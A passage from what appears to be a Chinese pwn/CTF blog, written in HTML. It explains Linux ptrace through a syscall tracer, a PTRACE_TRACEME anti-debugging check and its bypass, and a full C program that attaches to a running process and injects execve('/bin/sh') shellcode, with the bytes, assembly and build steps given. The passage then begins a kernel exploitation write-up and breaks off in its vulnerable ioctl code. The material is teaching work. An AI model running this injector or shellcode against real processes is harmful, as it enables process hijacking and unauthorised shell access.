<span class="comment">/* 获取rax值从而判断将要执行的系统调用号 */</span></span><br><span class="line">            ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">            <span class="keyword">if</span>(calling == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SYS_call ID:%d\n&quot;</span>,syscallID);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SYS_call with rdi:0x%llx, rsi:0x%llx, rdx:0x%llx\n&quot;</span>,regs.rdi, regs.rsi, regs.rdx);</span><br><span class="line">                calling = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                calling = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* 在子进程进入和退出系统调用时都将其暂停 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>被测试的文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test               </span><br><span class="line">SYS_call ID:<span class="number">59</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x0</span>, rdx:<span class="number">0x0</span></span><br><span class="line">SYS_call ID:<span class="number">12</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x7f6f9d3ace2c</span>, rdx:<span class="number">0x4c</span></span><br><span class="line">SYS_call ID:<span class="number">158</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3001</span>, rsi:<span class="number">0x7ffc51d572c0</span>, rdx:<span class="number">0x7f6f9d3a32d0</span></span><br><span class="line">SYS_call ID:<span class="number">21</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d3af9e0</span>, rsi:<span class="number">0x4</span>, rdx:<span class="number">0x7f6f9d387270</span></span><br><span class="line">SYS_call ID:<span class="number">257</span></span><br><span class="line">SYS_call with rdi:<span class="number">0xffffff9c</span>, rsi:<span class="number">0x7f6f9d3acb80</span>, rdx:<span class="number">0x80000</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d564c0</span>, rdx:<span class="number">0x7ffc51d564c0</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">3</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">257</span></span><br><span class="line">SYS_call with rdi:<span class="number">0xffffff9c</span>, rsi:<span class="number">0x7f6f9d3b6f60</span>, rdx:<span class="number">0x80000</span></span><br><span class="line">SYS_call ID:<span class="number">0</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56668</span>, rdx:<span class="number">0x340</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56280</span>, rdx:<span class="number">0x310</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56250</span>, rdx:<span class="number">0x20</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56200</span>, rdx:<span class="number">0x44</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56510</span>, rdx:<span class="number">0x7ffc51d56510</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x2000</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56160</span>, rdx:<span class="number">0x310</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d55e40</span>, rdx:<span class="number">0x20</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d55e20</span>, rdx:<span class="number">0x44</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x1f1660</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d19f000</span>, rsi:<span class="number">0x178000</span>, rdx:<span class="number">0x5</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d317000</span>, rsi:<span class="number">0x4e000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d365000</span>, rsi:<span class="number">0x6000</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d36b000</span>, rsi:<span class="number">0x3660</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">3</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x29</span>, rdx:<span class="number">0x0</span></span><br><span class="line">SYS_call ID:<span class="number">158</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1002</span>, rsi:<span class="number">0x7f6f9d370540</span>, rdx:<span class="number">0xffff809062c8f1a0</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d365000</span>, rsi:<span class="number">0x4000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x5574d07f8000</span>, rsi:<span class="number">0x1000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d3b4000</span>, rsi:<span class="number">0x1000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">11</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d371000</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0xb9b00000000</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1</span>, rsi:<span class="number">0x7ffc51d57120</span>, rdx:<span class="number">0x7ffc51d57120</span></span><br><span class="line">SYS_call ID:<span class="number">12</span> <span class="comment">/* 调用&quot;brk-12&quot;为tcache struct分配空间 */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x21000</span>, rdx:<span class="number">0x2b0</span></span><br><span class="line">SYS_call ID:<span class="number">12</span> <span class="comment">/* 调用&quot;brk-12&quot;为标准输出分配缓存 */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x5574d1669000</span>, rsi:<span class="number">0x21000</span>, rdx:<span class="number">0x7f6f9d36c620</span></span><br><span class="line">Hello World!</span><br><span class="line">SYS_call ID:<span class="number">1</span> <span class="comment">/* 调用&quot;write-1&quot; */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1</span>, rsi:<span class="number">0x5574d16482a0</span>, rdx:<span class="number">0xd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以看见 tracee 从调用 <code>execve-59</code> 构建进程上下文到调用 <code>write-1</code> 的全过程</li>
</ul>
<p><strong>ptrace 的使用 - 反调试</strong></p>
<p>ptrace 反调试的核心就在于主动执行 PTRACE_TRACEME：</p>
<ul>
<li>如果当前进程已经被追踪了，就不能被其他父进程追踪</li>
<li>因此可以提前执行 PTRACE_TRACEME 命令来避免被 GDB 调试</li>
</ul>
<p>测试案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) ==<span class="number">-1</span> )</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t trace me！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;no one trace me！\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常执行结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ./test</span><br><span class="line">no one trace me！</span><br></pre></td></tr></table></figure>
<p>调试结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">don&#x27;t trace me！</span><br><span class="line">[Inferior 1 (process 4654) exited with code 01]</span><br></pre></td></tr></table></figure>
<p>绕过的方式很简单，只要把相关的地方给 nop 掉就好：</p>
<img src="/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/1667297539745.png" class width="1667297539745"> 
<p>可以直接查看符号表来确定是否存在 prtace：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> objdump -t test | grep ptrace</span><br><span class="line"><span class="number">0000000000000000</span>       F *UND*	<span class="number">0000000000000000</span>              ptrace@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">➜  <span class="built_in">exp</span> readelf -s test | grep ptrace</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND ptrace@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">2</span>)</span><br><span class="line">    <span class="number">60</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND ptrace@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
<p><strong>ptrace 的使用 - 代码注入</strong></p>
<p>ptrace 可以对进程的追踪，并进行流程控制：</p>
<ul>
<li>用户寄存器值读取和写入操作</li>
<li>内存进行读取和修改</li>
</ul>
<p>需要用到的 ptrace 命令如下：</p>
<ul>
<li>PTRACE_POKETEXT，PTRACE_POKEDATA：往内存地址中写入一个字节，内存地址由 addr 给出</li>
<li>PTRACE_PEEKTEXT，PTRACE_PEEKDATA：从内存地址中读取一个字节，内存地址由 addr 给出 </li>
<li>PTRACE_ATTACH：跟踪指定 pid 进程 </li>
<li>PTRACE_GETREGS：读取所有寄存器的值 </li>
<li>PTRACE_CONT：继续执行被跟踪的子进程，signal 为“0”则忽略引起调试进程中止的信号，若不为“0”则继续处理信号 signal </li>
<li>PTRACE_SETREGS：设置寄存器</li>
<li>PTRACE_DETACH：结束跟踪 </li>
</ul>
<p>下面程序用于在 tracee 中注入一段 shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace-abi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> word_size = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, word_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>));</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x48\x31\xd2\x52\x48\x89\xe6\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 尝试连接目标进程 */</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs); <span class="comment">/* 获取tracee的寄存器 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get target RIP: 0x%llx\n&quot;</span>,regs.rip);</span><br><span class="line">    putdata(pid,regs.rip,shellcode,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    regs.rip += <span class="number">6</span>;</span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs); <span class="comment">/* 设置寄存器 */</span></span><br><span class="line">    ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 继续执行被跟踪的子进程 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This process is attacked by %s&quot;</span>,__FUNCTION__);</span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 结束跟踪 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的 shellcode 就是 <code>execve(/bin/sh)</code>，汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<ul>
<li>进行编译：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp nasm -f elf64 sh.s -o sh.o</span><br><span class="line">➜  exp ld sh.o -o sh</span><br></pre></td></tr></table></figure>
<ul>
<li>显示二进制代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  exp objdump --disassemble ./sh</span><br><span class="line"></span><br><span class="line">./sh：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:	48 31 d2             	xor    %rdx,%rdx</span><br><span class="line">  401003:	52                   	push   %rdx</span><br><span class="line">  401004:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401007:	48 b8 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rax</span><br><span class="line">  40100e:	2f 73 68 </span><br><span class="line">  401011:	50                   	push   %rax</span><br><span class="line">  401012:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401015:	48 31 c0             	xor    %rax,%rax</span><br><span class="line">  401018:	b0 3b                	mov    $0x3b,%al</span><br><span class="line">  40101a:	0f 05                	syscall </span><br></pre></td></tr></table></figure>
<p>测试文件如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;pid=%d\n&quot;</span>,getpid());</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> num=<span class="number">0</span>;num&lt;<span class="number">20</span>;num++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;num = %d\n&quot;</span>,num);</span><br><span class="line">		sleep(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/" class="post-title-link" itemprop="url">Tty_struct Attack+Modprobe_path Attack+Cred Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-29 02:03:16" itemprop="dateCreated datePublished" datetime="2022-10-29T02:03:16+08:00">2022-10-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 15:10:44" itemprop="dateModified" datetime="2023-04-02T15:10:44+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>hackme</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    #-gdb tcp::4869 -S \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x30002</span> )                       <span class="comment">// HACK_WRITE</span></span><br><span class="line">&#123;</span><br><span class="line">  index = userdata.index;</span><br><span class="line">  kheap_ptr = pool[index].ptr;</span><br><span class="line">  kheap = &amp;pool[index];</span><br><span class="line">  <span class="keyword">if</span> ( kheap_ptr &amp;&amp; userdata.offset + userdata.size &lt;= kheap-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;kheap_ptr[userdata.offset], userdata.data, userdata.size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span 